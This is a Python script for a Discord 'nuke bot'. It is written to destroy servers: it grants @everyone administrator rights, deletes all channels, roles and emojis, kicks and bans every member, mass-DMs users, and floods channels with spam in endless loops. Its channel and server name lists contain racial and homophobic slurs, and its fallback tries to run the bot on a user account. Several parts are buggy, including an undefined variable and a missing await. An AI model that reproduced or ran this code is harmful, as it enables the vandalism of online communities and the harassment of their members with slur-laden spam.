import discord
from discord.ext import commands
import random
from discord import Permissions
import os
import colorama
from colorama import Fore, Style
import asyncio
from discord_webhook import DiscordWebhook, DiscordEmbed

token = "Add bot token here"

CHANNEL_NAMES = ["get nuked bitch", "lol", "ez clap nigga", "lol rip ur server faggot"]

SERVER_NAMES = 	["faggots", "nigger", "nice server retard","1 nn"]
 
MESSAGE_CONTENTS = ["lol", "@everyone is getting fucked!", "Nuke Bot best bot @everyone", "server go bye bye :)"]

bot = commands.Bot(command_prefix='--')

client = commands.Bot(command_prefix='--')

bot.remove_command('help')

@bot.event
async def on_ready():
   print('Logged in {}'.format(bot.user.name))
   game = discord.Game("--help")
   await bot.change_presence(status=discord.Status.online, activity=game)


@bot.command()
async def help(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Nuke Commands", icon_url=ctx.author.avatar_url)
 
 embed.add_field(name="help", value="Shows this message.", inline=False)
 embed.add_field(name="nuke", value="Nukes the server.", inline=False)
 embed.add_field(name="dm <message>", value="Try DM everyone.", inline=False)
 embed.add_field(name="spam", value="Spams all channels.", inline=False)
 embed.add_field(name="roles", value="Spam make roles.", inline=False)
 embed.add_field(name="delete", value="Deletes all channels.", inline=False)
 embed.add_field(name="channels", value="Spam creates channels.", inline=False)
 embed.add_field(name="voicec",value="Spam creates voice channels.", inline=False)
 embed.add_field(name="kick", value="Kicks everyone below bot role.", inline=False)
 embed.add_field(name="ban", value="Bans all users below bot role.", inline=False)
 embed.add_field(name="sname",value="Constantly changes the server name", inline=False)
 embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)
 embed.add_field(name="cate",value="Spam creates categories.", inline=False)
 await ctx.send(embed=embed)
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Nuke Commands Page 2", icon_url=ctx.author.avatar_url)

 await ctx.send(embed=embed)

@bot.command()
async def nick(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: change nick")

@bot.command()
async def banuser(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

@bot.command()
async def rename(ctx, rename_to):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            await channel.edit(name=rename_to)
    
@bot.command()
async def emojidel(ctx):
 await ctx.message.delete()
 for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def dm(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: Mass DM")

@bot.command()
async def leave(ctx):
 await ctx.message.delete
 await ctx.guild.leave()

@bot.command()
async def guildname(ctx, *, name):
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + f"@everyone has been given admin permissions in {guild.name}."+ Fore.RESET)
    except:
      print(Fore.RED + f"There was an error when attempting to give everyone perms in {guild.name}." + Fore.RESET)
    print(Style.RESET_ALL)
    await asyncio.sleep(2)
    print(f"Nuking server {guild.name}...")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"{channel.name} was successfully deleted." + Fore.RESET)
      except:
        print(Fore.RED + f"{channel.name} was not deleted." + Fore.RESET)
    for member in guild.members:
      try:
        await member.kick()
        print(Fore.GREEN + f"{member.name}#{member.discriminator} was kicked." + Fore.RESET)
      except:
        print(Fore.RED + f"{member.name}#{member.discriminator} was not kicked." + Fore.RESET)
    for role in guild.roles:
      try:
        await role.delete()
        print(Fore.GREEN + f"{role.name} was successfully deleted." + Fore.RESET)
      except:
        print(Fore.RED + f"{role.name} was not deleted." + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban()
        print(Fore.GREEN + f"{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.RED + f"{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)
    print(Style.RESET_ALL)
    print(f"Nuked {guild.name} successfully!\n{link}")
    amount = 99
    for i in range(amount):
      await guild.create_text_channel(random.choice(CHANNEL_NAMES))
    print(f"Nuked {guild.name} successfully")
    return

@bot.command()
async def ban(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: Banned")  

@bot.command()
async def roledel(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def clear(ctx, amount=5):
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)

@bot.command()
async def roles(ctx): 
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Get Thrashed")



@bot.command()
async def spam(ctx, amount=1000000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(random.choice(MESSAGE_CONTENTS))
    else:
        while True:  
            for channel in ctx.guild.text_channels: 
              await channel.send(random.choice(MESSAGE_CONTENTS))      



@bot.command()
async def kick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")  
 

  
@bot.command()
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("@everyone does NOT have admin")

@bot.command()
async def sname(ctx, amount=999):
    await ctx.message.delete()
    for i in range(amount):
      while True:
        await ctx.guild.edit(name = random.choice(SERVER_NAMES))
                      
@bot.command()
async def cate(ctx, amount=100):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_category(random.choice(CHANNEL_NAMES))

@bot.command()
async def delete(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    print(f"Deleting channel {channel.name}")
    await channel.delete()
  await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
  await ctx.guild.create_voice_channel(random.choice(CHANNEL_NAMES))

@bot.command()
async def channels(ctx, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_text_channel(random.choice(CHANNEL_NAMES))


@bot.command()
async def voicec(ctx, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_voice_channel(random.choice(CHANNEL_NAMES))

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(MESSAGE_CONTENTS))

try:
  bot.run(token)
except:
  bot.run(token, bot = False)
